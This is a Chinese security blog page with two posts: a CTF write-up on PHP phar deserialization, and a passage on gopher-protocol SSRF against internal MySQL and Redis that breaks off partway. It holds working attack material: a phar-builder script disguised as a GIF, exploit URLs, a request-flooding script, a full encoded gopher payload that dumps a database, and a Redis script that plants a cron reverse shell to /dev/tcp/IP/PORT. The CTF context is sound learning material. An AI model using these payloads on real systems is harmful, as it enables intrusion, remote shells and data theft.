<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $FLAG    = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);                    <span class="comment">// 得到 flag 的匿名函数</span></span><br><span class="line">    $SECRET  = `/read_secret`;</span><br><span class="line">    $SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);   <span class="comment">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class="line">    @mkdir($SANDBOX);</span><br><span class="line">    @chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;                </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">        $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">        setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));      <span class="comment">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $avatar;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path;                                          <span class="comment">//设置了头像的路径为沙盒路径</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">                .<span class="string">"  global \$FLAG; \$FLAG();"</span>                                <span class="comment">/*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/</span></span><br><span class="line">                .<span class="string">"&#125;"</span>);</span><br><span class="line">            $_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $SECRET;</span><br><span class="line">        $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">        $data = unserialize($data);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar;                                               <span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line">                                                                            <span class="comment">//该函数不可绕过</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);            <span class="comment">//获取头像，检查头是否为GIF89a ，正确后存入沙盒,</span></span><br><span class="line">                                                                            <span class="comment">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">        file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;                                                 <span class="comment">//获取这个沙盒中的头像，</span></span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">"/avatar.gif"</span>) )</span><br><span class="line">            $path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">        header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="string">"upload"</span>)</span><br><span class="line">        upload(check_session());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>)</span><br><span class="line">        show(check_session());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>)</span><br></pre></td></tr></table></figure>

<p><strong>create_function函数分析()</strong></p>
<p>通过看大佬们的分析还真是涨了不少知识..,首先还是看一波``create_function`的官方文档</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z3E3pq.png" alt="Z3E3pq.png"></p>
<p>匿名函数的形式为<code>\0lambda_%</code>,<code>%d</code>为数字并且取决于匿名函数的个数，我们每访问一次题目，就会生成一个匿名函数，所以匿名函数的名字无法很好的去确定，但是，Apache的prefork模式则带来了一个很好的助攻。</p>
<blockquote>
<p>prefork模式可以算是很古老但是非常稳定的Apache模式。Apache在启动之初，就预先fork一些子进程，然后等待请求进来。之所以这样做，是为了减少频繁创建和销毁进程的开销。每个子进程只有一个线程，在一个时间点内，只能处理一个请求</p>
</blockquote>
<p>所以，当采用prefork工作模式的情况下，只要我们请求过大，并且超过默认设定的阙值，则会启动新的线程来处理请求，在新的线程中，匿名又会从1开始递增，这样我们就可以控制匿名函数的名字了。</p>
<p><strong>unserialize处分析</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac) )</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">    $data = unserialize($data);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar;                                               <span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line">                                                                        <span class="comment">//该函数不可绕过</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过逻辑分析一下这里的<code>unserialize</code>是无法利用的,因为前面有一个根本不可能绕过的点<code>!hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac)</code>如果<code>hmac</code>变量无法通过<code>hash</code>去解密，则程序会直接停止运行，所以<code>unserialize</code>处并没有办法进行反序列化。</p>
<p><strong>phar反序列化攻击</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $avatar;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path;                                          <span class="comment">//设置了头像的路径为沙盒路径</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">            .<span class="string">"  global \$FLAG; \$FLAG();"</span>                                <span class="comment">/*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/</span></span><br><span class="line">            .<span class="string">"&#125;"</span>);</span><br><span class="line">        $_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类函数的分析，如果反序列化成功，则会先去调用<code>destruct()</code>魔法 函数，但是这个<code>eval</code>其实并不能得到<code>flag</code>，因为前面的<code>random</code>值是随机的，所以真正获取<code>flag</code>的还是<code>$_GET[&#39;luckey&#39;]</code>，首先在自己的vps通过如下代码生成一个<code>avatar.phar</code>并且更名为<code>avatar.gif</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = <span class="string">'avatar.gif'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; &#125;</span><br><span class="line">$o = <span class="keyword">new</span> Admin();</span><br><span class="line">$filename = <span class="string">'avatar.phar'</span>;</span><br><span class="line">@unlink($filename);</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并且通过<code>http://题目IP/index.php?m=upload&amp;url=http://VPS_IP/</code>将avatar.gif上传上去。</p>
<p>第二次通过<code>phar</code>协议调用直接进行反序列化调用<code>destruct</code>函数进行<code>getflag</code>,<code>payload</code>为</p>
<p><code>http://题目IP/index.php?m=upload&amp;url=phar:///var/www/data/md5(your_ip)/&amp;lucky=%00lambda_1</code></p>
<p>七月火师傅的通过请求使<code>Apache</code>开启新线程的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">import</span> requests</span><br><span class="line"><span class="number">2.</span> <span class="keyword">import</span> socket</span><br><span class="line"><span class="number">3.</span> <span class="keyword">import</span> time</span><br><span class="line"><span class="number">4.</span> <span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="number">5.</span> <span class="keyword">try</span>:</span><br><span class="line"><span class="number">6.</span> ​    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="number">7.</span> <span class="keyword">except</span>:</span><br><span class="line"><span class="number">8.</span> ​    <span class="keyword">pass</span></span><br><span class="line"><span class="number">9.</span> </span><br><span class="line"><span class="number">10.</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="number">11.</span> ​    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="number">12.</span> ​        HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="number">13.</span> ​        PORT = <span class="number">8000</span></span><br><span class="line"><span class="number">14.</span> ​        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="number">15.</span> ​        s.connect((HOST, PORT))</span><br><span class="line"><span class="number">16.</span> ​        s.sendall(<span class="string">'GET /avatar.gif HTTP/1.1\nHost: localhost\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line"><span class="number">17.</span> ​        *<span class="comment"># s.close()*</span></span><br><span class="line"><span class="number">18.</span> ​        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line"><span class="number">19.</span> ​        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="number">20.</span> </span><br><span class="line"><span class="number">21.</span> i = <span class="number">8</span></span><br><span class="line"><span class="number">22.</span> pool = ThreadPool( i )</span><br><span class="line"><span class="number">23.</span> result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><ul>
<li>允许<code>phar : //</code>等关键词的出现</li>
<li>有反序列化环境的作用域</li>
</ul>
<h4 id="开头禁止phar-的绕过"><a href="#开头禁止phar-的绕过" class="headerlink" title="开头禁止phar://的绕过"></a>开头禁止phar://的绕过</h4><p>利用<code>compress.zlib</code>进行绕过，运行结果如下：<br><img src="https://s2.ax1x.com/2019/06/30/Z3nRfJ.png" alt="Z3nRfJ.png"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>今天不太刷手机真的学到了很多，还有不会读php源码是真的难受…Orz..看来今后的学习一定要向底层方向靠近一下了</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#2-如何创建一个合法的-Phar压缩文件" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#2-%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%90%88%E6%B3%95%E7%9A%84-Phar%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6</a></p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><a href="https://mochazz.github.io/2019/02/02/PHP反序列化入门之phar/" target="_blank" rel="noopener">https://mochazz.github.io/2019/02/02/PHP反序列化入门之phar/</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/30/%E5%88%A9%E7%94%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/" data-id="ckabsu393003dkkvr87mdf0gf" class="article-share-link" data-share="baidu" data-title="利用phar反序列化拓展攻击面">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/30/%E5%88%A9%E7%94%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Gopher协议邂逅内网应用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/30/Gopher%E5%8D%8F%E8%AE%AE%E9%82%82%E9%80%85%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/" class="article-date">
  <time datetime="2019-06-30T04:13:37.000Z" itemprop="datePublished">2019-06-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/30/Gopher%E5%8D%8F%E8%AE%AE%E9%82%82%E9%80%85%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/">Gopher协议邂逅内网应用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="gopher协议攻击内网Mysql"><a href="#gopher协议攻击内网Mysql" class="headerlink" title="gopher协议攻击内网Mysql"></a>gopher协议攻击内网Mysql</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>SSRF(Server-Side Request Forgery)服务端请求伪造攻击，是由攻击者构造形成由服务器端发起请求的漏洞，SSRF攻击的目标通常为内网应用，如<code>Mysql,redis,Fastcgi</code>等。</p>
<h4 id="Mysql介绍"><a href="#Mysql介绍" class="headerlink" title="Mysql介绍"></a>Mysql介绍</h4><p>Mysql分为服务端和客户端，客户端连接服务端的三种方式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Unix套接字；</span><br><span class="line">内存共享&#x2F;命名管道；</span><br><span class="line">TCP&#x2F;IP套接字</span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>Linux</code>环境下，客户端输入<code>mysql -u root -p root</code>登陆<code>Mysql</code>服务器用的则为Unix嵌套字连接；<code>Unix</code>并不是一个网络协议，只能在客户端与服务器端在同一台电脑上才可以使用。</li>
<li><code>windows</code>系统中客户端与Mysql服务器在同一台电脑，则使用命名管道/内存共享。</li>
<li>TCP/IP套接字是任何系统下都可以使用的方式，也是最多的连接方式，当输入<code>mysql -h 127.0.0.1 -u root -p root</code>时使用的就是TCP/IP嵌套字。</li>
</ul>
<h4 id="Mysql认证过程："><a href="#Mysql认证过程：" class="headerlink" title="Mysql认证过程："></a>Mysql认证过程：</h4><p>Mysql客户端连接登陆服务器端有两种方式:</p>
<ul>
<li>密码认证：服务器先发送salt然后使用salt进行加密密码然后验证</li>
<li>无密码认证：客户端直接发送TCP/IP数据包</li>
</ul>
<p>在非交互模式下登陆操作<code>Mysql</code>是在无需密码认证，非授权情况下进行的，而<code>SSRF</code>漏洞攻击内网<code>Mysql</code>也是在非授权情况下也就是无密码认证的情况下进行的。</p>
<h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>准备过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#39;lihuaiqiu&#39;@&#39;localhost&#39;;</span><br><span class="line">grant all privileges on *.* to lihuaiqiu@localhost identified by &#39;&#39;;</span><br></pre></td></tr></table></figure>

<p>开启一个终端无密码认证登陆<code>Mysql</code></p>
<p><code>mysql -h 127.0.0.1 -u lihuaiqiu</code></p>
<p>进行一系列操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use ssrf;</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">select * from flag;</span><br></pre></td></tr></table></figure>

<p>另开一个端口监听<code>3306</code>流量</p>
<p><code>tcpdump –i lo port 3306 –w hua1.pcay</code></p>
<p>用wireshark打开监听到的数据包</p>
<p><a href="https://imgchr.com/i/VBsA0I" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VBsA0I.md.png" alt="VBsA0I.md.png"></a></p>
<p>将数据转化为原始数据，并且进行格式转化</p>
<p><a href="https://imgchr.com/i/VBsIHI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VBsIHI.md.png" alt="VBsIHI.md.png"></a></p>
<p>执行生成出来的代码，回显结果</p>
<p><a href="https://imgchr.com/i/VByK56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/08/VByK56.md.png" alt="VByK56.md.png"></a></p>
<p>成功打出数据库中的内容。</p>
<h4 id="gopher协议与Mysql客户端任意文件读取组合拳"><a href="#gopher协议与Mysql客户端任意文件读取组合拳" class="headerlink" title="gopher协议与Mysql客户端任意文件读取组合拳"></a>gopher协议与Mysql客户端任意文件读取组合拳</h4><p>我的前几个博客中是有讲到客户端任意文件读取漏洞的，详情请移步<a href="https://lihuaiqiu.github.io/2019/06/01/Mysql客户端任意文件读取/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/06/01/Mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</a></p>
<p>组合拳思考:虽然<code>Mysql</code>伪造出来的恶意服务器在客户端连接的时候有读取任意文件的可能，但是如果我们想要的信息在数据库中，该怎么办？</p>
<p>这时，扫描器如果进行的是无密码登陆尝试，那么我们就可以在扫描器要扫描的端口上加一个<code>location gopher</code>直接打出数据库中的内容。实战例子：</p>
<p>DDCTF mysql弱口令：</p>
<p>这道题其实网上基本都是非预期解法，几乎没有去写用<code>gopher</code>进行<code>ssrf</code>的解法，下面就来讲一下组合拳也就是<code>ssrf</code>的解法。</p>
<p>扫描器仍然是通过8123端口的<code>agent.py</code>来判断<code>mysqld</code>是否开始，我们在通过伪造的恶意服务器来读取<code>views.py</code>后，发现提示<code>flag in mysql curl@localhost database:security table:flag</code>，所以可以通过在<code>vps</code>中d 8123的端口处加一个<code>location gopher</code>打出数据库的内容,<code>gopher</code>数据构造步骤如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u curl</span><br><span class="line"></span><br><span class="line">use security;</span><br><span class="line"></span><br><span class="line">select * from flag;</span><br><span class="line"></span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>

<p><code>tcpdump</code>抓包，转化为原始数据，接进<code>gopher</code>,构造后的数据为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;localhost:3306&#x2F;_%3c%00%00%01%85%a6%0f%20%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<p>在<code>vps</code>上构造一个<code>header location</code>，并且运行在8123端口</p>
<p><a href="https://imgchr.com/i/VsdBd0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/09/VsdBd0.md.png" alt="VsdBd0.md.png"></a></p>
<p>PS：将<code>payload.php</code>改为<code>index.php</code></p>
<p>扫描器访问8123端口就会自动跳转到<code>gopher</code>将自己的数据库信息打出来，访问<a href="http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=vps_ip&amp;target_port=3306" target="_blank" rel="noopener">http://117.51.147.155:5000/ctf/api/weak_scan?target_ip=vps_ip&amp;target_port=3306</a></p>
<p><a href="https://imgchr.com/i/Vswtk6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/09/Vswtk6.md.png" alt="Vswtk6.md.png"></a></p>
<p>将得到的<code>base64</code>解码，得到<code>DDCTF{0b5d05d80cceb4b85c8243c00b62a7cd}</code></p>
<h3 id="gopher协议攻击内网Redis"><a href="#gopher协议攻击内网Redis" class="headerlink" title="gopher协议攻击内网Redis"></a>gopher协议攻击内网Redis</h3><p>redis反弹shell的bash脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 -p $2 flushall</span><br><span class="line">echo -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure>

<p>利用socat转发流量并且抓取流量</p>
